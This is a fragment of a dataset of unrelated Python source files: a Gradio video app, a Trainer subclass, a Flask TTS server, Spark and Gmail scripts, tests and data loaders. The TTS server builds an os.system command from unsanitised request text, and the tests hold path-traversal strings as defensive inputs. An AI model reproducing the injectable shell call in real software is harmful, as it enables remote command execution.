frame_out_display, None\r\n            count += 1\r\n\r\n            # Press Q on keyboard to exit\r\n            if cv2.waitKey(25) & 0xFF == ord('q'):\r\n                break\r\n        else:\r\n            break\r\n\r\n    # When everything done, release the video capture and writer object\r\n    cap.release()\r\n    out.release()\r\n    # Closes all the frames\r\n    cv2.destroyAllWindows()\r\n    yield None, output_video\r\n\r\n# vid_inf(input_video)\r\n\r\n\r\n# gradio interface\r\ninput_video = gr.Video(label=\"Input Video\")\r\noutput_frames = gr.Image(label=\"Output Frames\")\r\noutput_video_file = gr.Video(label=\"Output video\")\r\n# sample_video=r'sample/car.mp4'\r\n\r\napp = gr.Interface(\r\n    fn=vid_inf,\r\n    inputs=[input_video],\r\n    outputs=[output_frames, output_video_file],\r\n    title=f\"MotionScope\",\r\n    description=f'A gradio app for dynamic video analysis tool that leverages advanced background subtraction and contour detection techniques to identify and track moving objects in real-time.',\r\n    allow_flagging=\"never\",\r\n    examples=[[\"sample/car.mp4\"]],\r\n)\r\napp.queue().launch()",
    "from transformers import Trainer\nimport torch \nimport torch.nn as nn\nfrom sklearn.metrics import accuracy_score, recall_score, f1_score, precision_score\nfrom loguru import logger\nfrom transformers.trainer_utils import EvalLoopOutput\nimport numpy as np\nimport datetime\n\n\n'''\n    \u7ee7\u627fTrainer\u7c7b\uff0c\u5b9e\u73b0\u81ea\u5b9a\u4e49\u7684\u4e00\u4e9b\u51fd\u6570\uff0c\u8fbe\u5230\u9b54\u6539\u7684\u6548\u679c,\u8fd9\u91cc\u53ea\u5199\u4e86\u51e0\u4e2a\u5e38\u7528\u7684\u65b9\u6cd5\uff0c\u53ef\u4ee5\u53c2\u8003\u4e0b\u9762\u7684\u94fe\u63a5\uff0c\u8fdb\u884c\u4fee\u6539:\n    https://github.com/huggingface/transformers/blob/v4.39.2/src/transformers/trainer.py#L3199\n'''\nclass MyTrainer(Trainer):\n\n    '''\n        \u8ba1\u7b97\u635f\u5931\u51fd\u6570\n        args:\n            model: \u6a21\u578b\n            inputs: \u8f93\u5165\u6570\u636e\n            return_outputs: \u662f\u5426\u8fd4\u56de\u8f93\u51fa\n        \u5df2check compute_loss \u6ca1\u95ee\u9898\n    '''\n    def compute_loss(self, model, inputs, return_outputs=False):\n        labels = inputs.pop(\"labels\")\n        # print(labels)\n        outputs = model(**inputs)\n        logits = outputs.get(\"logits\")\n        # compute custom loss (suppose one has 2 labels with different weights)\n        loss_fct = nn.CrossEntropyLoss(weight=torch.tensor([1.0, 2.0], device=model.device))\n        # 2\u5206\u7c7b \u76f4\u63a5\u8c03\u6574\u4e3a2\n        loss = loss_fct(logits.view(-1, self.model.config.num_labels), labels.view(-1))\n        return (loss, outputs) if return_outputs else loss\n\n\n    '''\n        \u5199\u5b8c\u8fd9\u4e2aevaluation_loop\u53d1\u73b0\u6211\u505a\u7684\u4e8b\u60c5 \u5728\u5916\u9762\u7684compute_metrics\u5b9e\u73b0\u66f4\u52a0\u7b80\u5355,\u4e0d\u8fc7\u4e3a\u4e86\u719f\u6089Trainer\u8fd8\u662f\u81ea\u5df1\u5199\u4e86\u4e00\u4e2a\n        \u6ce8\u610f\u8fd4\u56de\u503c\u4e00\u5b9a\u662fEvalLoopOutput\u7c7b\u578b\n        args:  \n            dataloader: \u6d4b\u8bd5\u96c6\n            description: \u63cf\u8ff0\n            prediction_loss_only: \u5982\u679c\u662fTrue\uff0c\u5219\u53ea\u8fd4\u56deloss\n            ignore_keys: \u5ffd\u7565\u7684key\n            metric_key_prefix: \u6307\u6807\u524d\u7f00\n    '''\n    def evaluation_loop(\n            self,\n            dataloader,\n            description,\n            prediction_loss_only,\n            ignore_keys,\n            metric_key_prefix,\n        ):\n            \"\"\"\n            Prediction/evaluation loop, shared by `Trainer.evaluate()` and `Trainer.predict()`.\n            Works both with or without labels.\n            \"\"\"\n            args = self.args\n            model = self._wrap_model(self.model, training=False)\n            self.callback_handler.eval_dataloader = dataloader\n            model.eval()\n            batch_size = args.per_device_eval_batch_size\n            num_examples = self.num_examples(dataloader)\n            print(f\"***** Running evaluation loop *****\")\n            print(f\"  Num examples = {num_examples}\")\n            print(f\"  Batch size = {batch_size}\")\n            \n\n            loss_list = []\n            labels_list = []\n            preds_list = []\n            # evaldataset\u7684\u5168\u90e8\u6837\u672c\u7b97\u4e00\u6b21\u51c6\u786e\u7387 \u4e00\u4e2abatch\u7b97  \u7136\u540e\u53e0\u52a0\n            for step, inputs in enumerate(dataloader):\n\n                loss, logits, labels = self.prediction_step(model, inputs, prediction_loss_only=False, ignore_keys=ignore_keys)\n\n                # \u4e00\u4e2abatch\u7b97\n                logits = nn.Softmax(dim=1)(logits)\n                pred_labels = torch.argmax(logits, dim=1)\n\n                loss = loss.detach().cpu().numpy()\n                labels = labels.detach().cpu().numpy()\n                pred_labels = pred_labels.detach().cpu().numpy()\n\n                loss_list.append(loss)\n                labels_list.extend(labels)\n                preds_list.extend(pred_labels)\n\n\n                self.control = self.callback_handler.on_prediction_step(args, self.state, self.control)\n            metrics = {}\n\n            test_loss = np.mean(loss_list)\n            test_accuracy = accuracy_score(labels_list, preds_list)\n            test_precision = precision_score(labels_list, preds_list, average='macro')\n            test_recall = recall_score(labels_list, preds_list, average='macro')\n            test_f1_score = f1_score(labels_list, preds_list, average='macro')\n\n            loss_dict = {'loss': test_loss,'accuracy': test_accuracy, 'recall':test_recall, 'f1_score':test_f1_score, 'precision':test_precision}\n\n            logger.info(\"==========test_loss{}==========\".format(test_loss))\n            logger.info(\"==========test_accuracy{}==========\".format(test_accuracy))\n            logger.info(\"==========test_recall{}==========\".format(test_recall))\n            logger.info(\"==========test_f1_score{}==========\".format(test_f1_score))\n            logger.info(\"==========test_precision{}==========\".format(test_precision))\n            \n            '''\n                \u4e0b\u9762\u7684\u8fd9\u4e2a\u4f5c\u7528\u597d\u50cf\u662f\u5728\u8fdb\u5ea6\u6761\u8fd4\u56de\u8fd9\u4e2ametric\uff0c\u5c31\u662fmetric\u90fd\u4f1a\u5728tdqm bar\u4e0a\u9762\u663e\u793a\n            '''\n            for key, value in loss_dict.items():\n                metrics['eval_' + key] = torch.tensor(value).item()\n\n            print('[MyTrainer]: Evaluation done)')\n\n            output = EvalLoopOutput(predictions=preds_list, label_ids=labels_list, metrics=metrics, num_samples=num_examples)\n            return output\n    \n    '''\n        \u8fd9\u91cc\u548cevaluation_loop\u5dee\u4e0d\u591a,\u8fd9\u91cc\u6ca1\u6709\u505a\u8fd9\u4e2a\u5b9e\u73b0\uff0c\u53ea\u662f\u8bf4\u660e\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u627f\u8fd9\u4e2a\u65b9\u6cd5\u8fdb\u884c\u6539\u5199\u3002\n        args:\n            dataloader: \u6d4b\u8bd5\u96c6\n            description: \u63cf\u8ff0\n            prediction_loss_only: \u5982\u679c\u662fTrue\uff0c\u5219\u53ea\u8fd4\u56deloss\n            ignore_keys: \u5ffd\u7565\u7684key\n            metric_key_prefix: \u6307\u6807\u524d\u7f00\n    '''\n    def prediction_loop(\n            self,\n            dataloader,\n            description: str,\n            prediction_loss_only,\n            ignore_keys,\n ",
    "# encoding=utf-8\nimport hashlib\nimport os\nfrom flask import Flask, request, jsonify, make_response, send_from_directory\nimport re\nimport time\nimport uuid\napp = Flask(__name__)\n# tts\nvoiceMap = {\n    \"xiaoxiao\": \"zh-CN-XiaoxiaoNeural\",\n    \"xiaoyi\": \"zh-CN-XiaoyiNeural\",\n    \"yunjian\": \"zh-CN-YunjianNeural\",\n    \"yunxi\": \"zh-CN-YunxiNeural\",\n    \"yunxia\": \"zh-CN-YunxiaNeural\",\n    \"yunyang\": \"zh-CN-YunyangNeural\",\n    \"xiaobei\": \"zh-CN-liaoning-XiaobeiNeural\",\n    \"xiaoni\": \"zh-CN-shaanxi-XiaoniNeural\",\n    \"hiugaai\": \"zh-HK-HiuGaaiNeural\",\n    \"hiumaan\": \"zh-HK-HiuMaanNeural\",\n    \"wanlung\": \"zh-HK-WanLungNeural\",\n    \"hsiaochen\": \"zh-TW-HsiaoChenNeural\",\n    \"hsioayu\": \"zh-TW-HsiaoYuNeural\",\n    \"yunjhe\": \"zh-TW-YunJheNeural\",\n}\n\ndef getVoiceById(voiceId):\n    return voiceMap.get(voiceId)\n\n# \u5220\u9664html\u6807\u7b7e\ndef remove_html(string):\n    regex = re.compile(r'<[^>]+>')\n    return regex.sub('', string)\n\n\ndef createAudio(text, voiceId, rate):\n    new_text = remove_html(text)\n    voice = getVoiceById(voiceId)\n    rate = f\"+{rate}%\"\n    if not voice:\n        return \"error params\"\n    data_md5 = hashlib.md5((text+voiceId+rate).encode('utf-8')).hexdigest()\n    file_name = f'{data_md5}.mp3'\n    if os.path.exists(file_name):\n        pwdPath = os.getcwd()\n        filePath = pwdPath + \"/\" + file_name\n        return filePath\n    pwdPath = os.getcwd()\n    filePath = pwdPath + \"/\" + file_name\n    dirPath = os.path.dirname(filePath)\n    if not os.path.exists(dirPath):\n        os.makedirs(dirPath)\n    if not os.path.exists(filePath):\n        # \u7528open\u521b\u5efa\u6587\u4ef6 \u517c\u5bb9mac\n        open(filePath, 'a').close()\n    script = 'edge-tts --rate=' + rate + ' --voice ' + voice + ' --text \"' + new_text + '\" --write-media ' + filePath\n    os.system(script)\n    return filePath\n\n@app.route('/tts', methods=['POST', 'GET'])\ndef tts():\n    clear_tmp_file()\n    text = request.args.get('text')\n    if len(text) <= 0:\n        return jsonify({\"code\": \"\u5f02\u5e38\", \"message\": \"text\u53c2\u6570\u4e0d\u80fd\u4e3a\u7a7a\"})\n    voice = request.args.get('voice')\n    rate = request.args.get('rate')\n    print(text, voice, rate)\n    filePath = createAudio(text, voice, rate)\n    r = os.path.split(filePath)\n    print(r)\n    try:\n        response = make_response(\n            send_from_directory(r[0], r[1], as_attachment=True))\n        return response\n    except Exception as e:\n        return jsonify({\"code\": \"\u5f02\u5e38\", \"message\": \"{}\".format(e)})\n\n\n\ndef clear_tmp_file(sec=120):\n    zip_file_list = os.listdir(os.getcwd())\n    for file in zip_file_list:\n        if file.endswith('.zip') or file.endswith('mp3') or file.endswith('jpg'):\n            zip_file_time = os.path.getmtime(file)\n            if (time.time() - zip_file_time) > sec:\n                os.remove(file)\n\n@app.route('/', methods=['GET', 'POST'])\ndef index():\n    return 'OK'\n\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\", port=9898)",
    "\"\"\"\nTransform and save BMRS data depending category (generation or capacity)\n1. Select columns\n2. Convert types\n3. Rename column to snake case\n\nArgs:\n    bmrs_data_category (BmrsDataCategory): GENERATION or CAPACITY\n    data (Dict): JSON response data\n    output_filepath (str): Destination path to save the fetched and processed data\n\"\"\"\nimport os\nimport sys\n\nfrom loguru import logger\nfrom pyspark.sql import SparkSession\nfrom pyspark.sql import functions as F\n\ncurrent_file_path = os.path.abspath(__file__)\nparent_directory = os.path.dirname(os.path.dirname(current_file_path))\nsys.path.append(parent_directory)\n\nfrom common.utils import rename_column_camel_case_to_snake_case\nfrom common.namings import BmrsDataCategory\nfrom common.schema import BMRS_SCHEMAS\nfrom common.file_config import batch_bmrs_capacity_output_filepath, batch_bmrs_capacity_json_raw_output_filepath\n\nbmrs_data_category = BmrsDataCategory.CAPACITY\n\n# Initialize Spark session\nspark = SparkSession.builder \\\n    .master(\"local\") \\\n    .appName(\"BmrsDataTransformation\") \\\n    .getOrCreate()\n\n# Read BMRS JSON data into Spark DataFrame\nschema = BMRS_SCHEMAS[bmrs_data_category]\n\nlogger.info('Loading BMRS capacity JSON data in PySpark...')\n\ndf = spark.read.json(batch_bmrs_capacity_json_raw_output_filepath, schema=schema)\n    \nlogger.info('Transforming BMRS capacity data...')\n\n# Convert halfHourEndTime to datetime type\n# Convert settlementDate to datetime type\n# Rename columns to snake case\ncolumns_snake_case = rename_column_camel_case_to_snake_case(schema.names)\n\ndf = df \\\n    .withColumn('publishTime', F.to_timestamp('publishTime')) \\\n    .withColumn('effectiveFrom', F.to_timestamp('effectiveFrom')) \\\n    .na.drop(subset=['bmUnit'])\n\ndf = df.toDF(*columns_snake_case) \n\nlogger.info(f'Saving BMRS {BmrsDataCategory.CAPACITY.name} data to local folder {batch_bmrs_capacity_output_filepath}...')\n\n# Save dataframe as parquet\ndf.write.mode('overwrite').parquet(batch_bmrs_capacity_output_filepath)\nlogger.info(f'BMRS {BmrsDataCategory.CAPACITY.name} data saved.')",
    "# Disclaimer: This script is for educational purposes only. \r\n# Do not use against any network, system or application that you don't own or have authorisation to test.\r\n\r\nimport requests\r\nfrom bs4 import BeautifulSoup as bs\r\nfrom urllib.parse import urlparse,urljoin\r\nfrom sys import argv\r\n\r\n\r\ndef verify_url(url:str) -> str:\r\n    \"\"\"\r\n    This function take as argument an url to test as str, and return a message to know if the url\r\n    is correct or not.\r\n    \"\"\"\r\n    if type(url) != str:\r\n        return \"\"\r\n\r\n    try:\r\n        test = requests.get(url) # we try to make a request\r\n        if test.status_code == 404: \r\n            return \"error\" # if the site exists but not the page, we return an error\r\n        else:\r\n            return \"ok\" # if the page exists, we return \"ok\"\r\n    except:\r\n        return \"error\" # if the site doesn't exists or if the url is malformed, we return an error\r\n\r\n\r\nclass explorer:\r\n    def __init__(self,site_url:str) -> None:\r\n        \"\"\"\r\n        This class is used as the explorer itself.\r\n        \"\"\"\r\n        if type(site_url) != str:\r\n            return None\r\n\r\n        self.site_url = site_url # this is the url provided by user\r\n        self.url_list = [self.site_url] # this is the list used to store the nexts links to process\r\n        self.urls_and_sources = {} # this dictionnary store the \"final data\"\r\n\r\n\r\n    def find_internal_links(self,url:str) -> tuple:\r\n        \"\"\"\r\n        This method take as argument the url of a web page and return the url itself and all internal links found in the html content of the page.\r\n        \"\"\"\r\n        if type(url) != str:\r\n            return []\r\n\r\n        internal_links = [] # list of internal links\r\n        domain_name = urlparse(url).netloc # domain name of the site (this is useful to know if a link is internal or external)\r\n        soup = bs(requests.get(url).content, \"html.parser\") # find the html content\r\n\r\n        for a in soup.findAll(\"a\"):\r\n            \"\"\"\r\n            for each link we find :\r\n            \"\"\"\r\n            href = a.attrs.get(\"href\") # find the link itself\r\n            if href == \"\" or href is None: # if the link is null, we continue\r\n                continue\r\n                \r\n            href = urljoin(url, href)\r\n            parsed_href = urlparse(href)\r\n            href = parsed_href.scheme + \"://\" + parsed_href.netloc + parsed_href.path\r\n\r\n            if href in internal_links:\r\n                continue # if the link has been already found, we continue\r\n\r\n            if domain_name in href:\r\n                internal_links += [href] # if the link is internal, we add it to the list\r\n\r\n        return (url,internal_links) #return of the url and the list\r\n\r\n\r\n    def explore(self) -> None:\r\n        \"\"\"\r\n        this method the the \"main\" method of the class explorer.\r\n        \"\"\"\r\n        for url in self.url_list: # each url is processed.\r\n            base_url,internal_links = self.find_internal_links(url) # find every internal links in the page.\r\n            for link in internal_links:\r\n                if not link in self.url_list: # if this is a new link :\r\n                    print(f\"[+] link found : {link} (source : {base_url})\\n\") # output\r\n                    self.url_list.append(link) # added to urls to process\r\n                try:\r\n                    self.urls_and_sources[base_url].append(link) # if there is already an element for this base url into the dictionnary\r\n                except:\r\n                    self.urls_and_sources[base_url] = [link] \r\n    \r\n    \r\n    def save_results(self,filename:str) -> None:\r\n        \"\"\"\r\n        This method is used to store data into a file if asked by user\r\n        \"\"\"\r\n        if type(filename) != str:\r\n            return None\r\n\r\n        with open(filename,\"w\") as file:\r\n            for key,value in self.urls_and_sources.items():\r\n                file.write(key + \" : \\n\") # we write the source url\r\n                for link in value:\r\n                    file.write(link + \"\\n\") # we write each url found with the source url\r\n                file.write(\"\\n\") # a space to make the file more readable\r\n            file.close()\r\n    \r\n    \r\ndef main() -> None:\r\n    \"\"\"\r\n    This is the main function. After doing some tests about the url provided by the user,\r\n    we create an explorer and we use it. Then we verify if the user specified a file to store results.\r\n    If it is, we write all urls found into the file.\r\n    \"\"\"\r\n    print(\"###### automated pages explorer ######\")\r\n    try:\r\n        url = argv[1] #try to store url provided by user \r\n    except IndexError:\r\n        print(\"[-] error : url not specified\")\r\n        return None\r\n\r\n    test_url = verify_url(url) # verification of the url\r\n\r\n    if test_url == \"error\":\r\n        print(f\"[-] error : url {url} is invalid\")\r\n        return None\r\n\r\n    pages_explorer = explorer(url) # create the explorer\r\n    pages_explorer.explore() # explore\r\n    \r\n    try:\r\n        filename = argv[2] # try to find the storing file name\r\n    ",
    "# Authenticate\n\nfrom __future__ import print_function\n\nimport datetime\nfrom time import time\nimport argparse\n\nimport os.path\nimport base64  # to decode message body\nimport re\n\nfrom google.auth.transport.requests import Request\nfrom google.oauth2.credentials import Credentials\nfrom google_auth_oauthlib.flow import InstalledAppFlow\nfrom googleapiclient.discovery import build\nfrom googleapiclient.errors import HttpError\nfrom email.message import EmailMessage\n\nimport html2text\n\nfrom llms import openai_replier\n\nfrom parameters import LABELS, MAX_EMAILS, NEWER_THAN, MAX_EMAIL_LENGTH, SKIP_SUBJECT, SKIP_FROM\n\ntext_maker = html2text.HTML2Text()\ntext_maker.ignore_images = True\ntext_maker.ignore_emphasis = True\n\nap = argparse.ArgumentParser(\n    prog='python3 email-replier.py', description='Create draft replies to emails'\n)\nap.add_argument('-c', \"--check\", help=\"Check emails without replying\", action='store_true')\n\n\ndef authenticate():\n\n    print(\"Authenticating gmail\")\n    # If modifying these scopes, delete the file token.json.\n    SCOPES = ['https://www.googleapis.com/auth/gmail.modify']\n\n    creds = None\n    # The file token.json stores the user's access and refresh tokens, and is\n    # created automatically when the authorization flow completes for the first\n    # time.\n    if os.path.exists('token.json'):\n        creds = Credentials.from_authorized_user_file('token.json', SCOPES)\n\n    # If there are no (valid) credentials available, let the user log in.\n    if not creds or not creds.valid:\n        if creds and creds.expired and creds.refresh_token:\n            creds.refresh(Request())\n        else:\n            flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)\n            creds = flow.run_local_server(port=0)\n        # Save the credentials for the next run\n        with open('token.json', 'w') as token:\n            token.write(creds.to_json())\n\n    try:\n        # Call the Gmail API\n        service = build('gmail', 'v1', credentials=creds)\n        return service\n\n    except HttpError as error:\n        print(f'An error occurred: {error}')\n\n\ndef get_mails(service, max_msgs=10, newer_than='7d', labels_ids=['UNREAD', 'INBOX']):\n\n    max_snippet_length = 180  # snippet is ~200 chars max (not found in gmail api)\n    received_emails = []\n\n    try:\n        print('Getting unread messages...')\n\n        results = (\n            service.users()\n            .messages()\n            .list(\n                userId='me',\n                labelIds=labels_ids,\n                maxResults=max_msgs,\n                q='newer_than:' + newer_than,\n            )\n            .execute()\n        )\n\n        messages_list = results.get('messages', [])\n\n        if not messages_list:\n            print('Yo have no new messages.')\n            return messages_list\n\n        print('You have', len(messages_list), 'messages')\n\n        # Check messages ids\n        # print('Message list:')\n        # print(messages_list)\n\n        # Get messages\n        for msg_info in messages_list:\n            email = {\n                'id': None,\n                'message_id': None,\n                'thread_id': None,\n                'mime_type': None,\n                'is_text': False,\n                'from': '',\n                'date': '',\n                'subject': '',\n                'snippet': '',\n                'body': '',\n                'body_type': '',\n                'reply': '',\n            }\n\n            email['id'] = msg_info.get('id')\n            email['thread_id'] = msg_info.get('threadId')\n\n            msg = service.users().messages().get(userId='me', id=msg_info.get('id')).execute()\n            # format:  full, metadata, minimal, raw\n\n            payload = msg.get('payload')  # dict\n            email['mime_type'] = payload.get('mimeType')\n\n            # Headers. Email info. List of dicts of the form {'name':'field', 'value':'valuex'}\n            headers = payload.get('headers')\n\n            # Parse headers of message\n            for header in headers:\n                if header.get('name') == 'From':\n                    email['from'] = header.get('value') or None\n                if header.get('name') == 'Subject':\n                    email['subject'] = header.get('value') or None\n                if header.get('name') == 'Date':\n                    email['date'] = header.get('value') or None\n                if header.get('name') == 'Message-ID':\n                    email['message_id'] = header.get('value') or None\n\n            # Content\n            email['snippet'] = msg.get('snippet')  # snippet is ~200 chars max\n\n            if len(email['snippet']) > max_snippet_length:\n                # Parse for text parts\n                parts = payload.get('parts')  # list\n                if parts:\n                    content = None\n                    for p in parts:\n                        if p.get('mimeType') in ['text/plain', 'text/html'] and p.get('body').get(\n                            'size'\n                        ):\n                  ",
    "import numpy as np\nimport unittest\n\nfrom controller import AppState\n\n\nclass TestAddSlice(unittest.TestCase):\n    def setUp(self) -> None:\n        super().setUp()\n\n        self.state = AppState()\n        self.state.filename = 'test'\n\n    def test_add_slice_normal(self):\n        # Create a mock slice image and depth value\n        slice_image1 = 'image-1'\n        depth1 = 5\n\n        # Call the function\n        insert1 = self.state.add_slice(slice_image1, depth1)\n\n        self.assertEqual(insert1, 0)\n        self.assertEqual(len(self.state.image_slices), 1)\n        self.assertEqual(self.state.image_depths[0], depth1)\n\n        slice_image2 = 'image-2'\n        depth2 = 10\n\n        # Call the function\n        insert2 = self.state.add_slice(slice_image2, depth2)\n\n        # Check whether this slice was added before the first slice\n        self.assertEqual(insert2, 1)\n        self.assertEqual(len(self.state.image_slices), 2)\n        self.assertEqual(self.state.image_depths[0], depth1)\n        self.assertEqual(self.state.image_depths[1], depth2)\n\n    def test_add_slice_reverse(self):\n        # Create a mock slice image and depth value\n        slice_image1 = 'image-1'\n        depth1 = 5\n\n        # Call the function\n        insert1 = self.state.add_slice(slice_image1, depth1)\n\n        self.assertEqual(insert1, 0)\n        self.assertEqual(len(self.state.image_slices), 1)\n        self.assertEqual(self.state.image_depths[0], depth1)\n\n        slice_image2 = 'image-2'\n        depth2 = 1\n\n        # Call the function\n        insert2 = self.state.add_slice(slice_image2, depth2)\n\n        # Check whether this slice was added before the first slice\n        self.assertEqual(insert2, 0)\n        self.assertEqual(len(self.state.image_slices), 2)\n        self.assertEqual(self.state.image_depths[0], depth2)\n        self.assertEqual(self.state.image_depths[1], depth1)\n\n        slice_image3 = 'image-2'\n        depth3 = 1\n\n        # Call the function\n        insert3 = self.state.add_slice(slice_image3, depth3)\n\n        # Check that the slice was added and depth increased to avoid duplicates\n        self.assertEqual(insert3, 1)\n        self.assertEqual(len(self.state.image_slices), 3)\n        self.assertEqual(self.state.image_depths[0], depth2)\n        self.assertEqual(self.state.image_depths[1], depth3+1)\n\n        # check that all the filenames are accurate\n        expected = [\n            'test/image_slice_1.png',\n            'test/image_slice_2.png',\n            'test/image_slice_0.png'\n        ]\n        self.assertEqual(self.state.image_slices_filenames, expected)\n\n\nclass TestCheckPathnames(unittest.TestCase):\n    def setUp(self) -> None:\n        super().setUp()\n\n        self.state = AppState()\n        self.state.filename = 'appstate-test'\n\n    def test_check_pathnames_valid(self):\n        # Set up valid pathnames\n        self.state.image_slices_filenames = [\n            'appstate-test/image_slice_1.png',\n            'appstate-test/image_slice_2.png',\n            'appstate-test/image_slice_0.png'\n        ]\n\n        # Call the function\n        self.state.check_pathnames()\n\n    def test_check_pathnames_invalid_root(self):\n        # Set up invalid root pathname\n        self.state.filename = 'invalid_root/../something'\n        self.state.image_slices_filenames = [\n            'appstate-test/image_slice_2.png',\n            'appstate-test/image_slice_0.png'\n        ]\n\n        # Call the function and expect an AssertionError\n        with self.assertRaises(AssertionError):\n            self.state.check_pathnames()\n\n    def test_check_pathnames_invalid_filenames(self):\n        # Set up invalid filenames\n        self.state.image_slices_filenames = [\n            'appstate-test/image_slice_1.png',\n            'appstate-test/image_slice_2.png',\n            'appstate-test/../../../invalid_filename.png'\n        ]\n\n        # Call the function and expect an AssertionError\n        with self.assertRaises(AssertionError):\n            self.state.check_pathnames()\n\n\nclass TestChangeSliceDepth(unittest.TestCase):\n    def setUp(self) -> None:\n        super().setUp()\n\n        self.state = AppState()\n        self.state.filename = 'test'\n\n        # Add some initial slices\n        self.state.add_slice('image-1', 5, positive_prompt=\"one\", negative_prompt=\"two\")\n        self.state.add_slice('image-2', 10, positive_prompt=\"three\", negative_prompt=\"four\")\n        self.state.add_slice('image-3', 15, positive_prompt=\"blue\", negative_prompt=\"green\")\n\n    def test_change_slice_depth_same_depth(self):\n        # Get the initial state\n        initial_slices = self.state.image_slices.copy()\n        initial_depths = self.state.image_depths.copy()\n\n        # Change the depth of the second slice to the same depth\n        slice_index = 1\n        depth = 10\n        new_index = self.state.change_slice_depth(slice_index, depth)\n\n        # Check that the slice index remains the same\n        self.assertEqual(new_index, slice_index)\n\n        # Check that the slices and depths remain unc",
    "## Importing necessary libraries and packages\nimport pandas as pd\nimport numpy as np\nimport os\nimport netCDF4\n\n# Reads in the Best Track dataset, which contain records of the location and maximum wind speed of every recorded hurricane in the Atlantic and Eastern/Central Pacific basins\nbest_track_data = pd.read_csv('besttrack.csv')\n\n# The number of pixels wide and tall to crop the images of hurricanes to\nside_length = 50\n\n# Lists to hold the hurricane images and the wind speed associated with those images. These lists are aligned so that the first image in the images list corresponds to the first label in the labels list.\nimages = []\nlabels = []\n\n# Gets list of names of files, each file containing a satellite image\nfiles = os.listdir('Satellite Imagery')\nnum_files = len(files)\n\nfor i in range(len(files)):\n    # Get IR satellite image from the file\n    raw_data = netCDF4.Dataset('Satellite Imagery/' + files[i])\n    ir_data = raw_data.variables['IRWIN'][0]\n\n    # Cropping the image\n    south_bound = (ir_data.shape[0] - side_length) // 2\n    north_bound = south_bound + side_length\n    cropped_ir_data = ir_data[south_bound:north_bound]\n    west_bound = (ir_data.shape[1] - side_length) // 2\n    east_bound = side_length\n    cropped_ir_data = np.delete(cropped_ir_data, np.s_[:west_bound], axis=1)\n    cropped_ir_data = np.delete(cropped_ir_data, np.s_[east_bound:], axis=1)\n\n    # Get storm name, date, and time of the hurricane from the image's file name\n    file_name = files[i]\n    file_name = file_name.split('.')\n    storm_name = file_name[1]\n    date = int(file_name[2] + file_name[3] + file_name[4])\n    time = int(file_name[5])\n\n    # Filter the \"besttrack.csv\" dataset to find the row that matches the name, date, and time of this hurricane image\n    matching_best_track_data = best_track_data.loc[\n        (best_track_data.storm_name == storm_name) &\n        (best_track_data.fulldate == date) &\n        (best_track_data.time == time)\n    ]\n\n    # Get the wind speed from the row that matches the name, date, and time of this hurricane image\n    try:\n        wind_speed = matching_best_track_data.max_sus_wind_speed.reset_index(drop=True)[0]\n    except Exception:\n        print('\\rCould not find label for image of ' + storm_name + ' at date ' + str(date) + ' and time ' + str(time), end='\\n')\n        continue  # Skip to the next hurricane image if the a wind speed could not be found for this hurricane image\n\n    # Add the image and wind speed to these lists. This way, the lists of images and labels always line up. The first\n    # hurricane image in the images list is associated with the first wind speed in the labels list.\n    images.append(cropped_ir_data)\n    labels.append(wind_speed)\n\n    raw_data.close()\n\n    print('\\rProcessing Samples.... ' + str(round(((i + 1) / num_files) * 100, 1)) + '% (' + str(i + 1) + ' of ' + str(\n        num_files) + ')', end='')\n\nprint('\\nSaving NumPy arrays....')\n\n# Turn the list of images and labels into NumPy arrays\nimages = np.array(images)\nlabels = np.array(labels)\n\n# Add a fourth dimension to the images array. This is one since we only have one color channel: grayscale. The fourth\n# dimension would typically be 3 if we were working with color images\nimages = images.reshape((images.shape[0], side_length, side_length, 1))\n\n# Saving the NumPy arrays files\nnp.save('images.npy', images)\nnp.save('labels.npy', labels)\n\nprint(\"\\nNumPy files saved\")",
    "import os\n\nimport pandas as pd\nfrom PIL import Image\n\nimport torch\n\nfrom torch.utils import data\nimport numpy as np\nimport scipy.io as scio\nimport random\n\nclass VideoDataset(data.Dataset):\n    \"\"\"Read data from the original dataset for feature extraction\"\"\"\n    def __init__(self, data_dir, data_dir_3D, filename_path, transform, dataset_name, crop_size, seed=0):\n        super(VideoDataset, self).__init__()\n\n        self.video_names, self.score = self.load_video_names_scores(filename_path, dataset_name, seed)\n        self.crop_size = crop_size\n        self.videos_dir = data_dir\n        self.data_dir_3D = data_dir_3D\n        self.transform = transform\n        self.length = len(self.video_names)\n        self.dataset_name = dataset_name\n\n    def load_video_names_scores(self, filename_path, dataset_name, seed):\n        \"\"\"\n        Load the names of videos and their scores in a dataset from a specified file.\n\n        Args:\n            filename_path (str): The path of the file containing the video names.\n            dataset_name (str): The name of the dataset.\n\n        Returns:\n            video_names (list): A list of video names in the dataset.\n            scores (list): A list of video scores in the dataset.\n\n        Raises:\n            ValueError: If the dataset name is not supported.\n        \"\"\"\n\n\n        if 'KoNViD1k' in dataset_name or 'youtube_ugc' in dataset_name or 'LIVEVQC' in dataset_name or \\\n            'LBVD' in dataset_name or 'LIVEYTGaming' in dataset_name:\n            dataInfo = scio.loadmat(filename_path)\n            if 'KoNViD1k' in dataset_name:\n                video_names = [dataInfo['video_names'][i][0][0] for i in range(len(dataInfo['video_names']))]\n                scores = [dataInfo['scores'][i][0] for i in range(len(dataInfo['scores']))]\n            elif 'youtube_ugc' in dataset_name:\n                video_names = [dataInfo['video_names'][i][0][0] for i in range(len(dataInfo['video_names']))]\n                scores = [dataInfo['scores'][0][i] for i in range(len(dataInfo['scores'][0]))]\n            elif 'LIVEVQC' in dataset_name:\n                video_names = [dataInfo['video_list'][i][0][0] for i in range(len(dataInfo['video_list']))]\n                scores = [dataInfo['mos'][i][0] for i in range(len(dataInfo['mos']))]\n            elif 'LBVD' in dataset_name:\n                video_names = [dataInfo['video_names'][i][0][0] for i in range(len(dataInfo['video_names']))]\n                video_names = [dataInfo['scores'][i][0] for i in range(len(dataInfo['scores']))]\n            elif 'LIVEYTGaming' in dataset_name:\n                video_names = [dataInfo['video_list'][i][0][0]+'.mp4' for i in range(len(dataInfo['video_list']))]\n                video_names = [dataInfo['MOS'][i][0] for i in range(len(dataInfo['MOS']))]\n            video_names, scores = self.load_subset_video_names_scores(dataset_name, video_names, scores, seed)\n        elif dataset_name == 'LIVE_Qualcomm':\n            m = scio.loadmat(filename_path)\n            dataInfo = pd.DataFrame(m['qualcommVideoData'][0][0][0])\n            dataInfo['MOS'] = m['qualcommSubjectiveData'][0][0][0]\n            dataInfo.columns = ['file_names', 'MOS']\n            dataInfo['file_names'] = dataInfo['file_names'].astype(str)\n            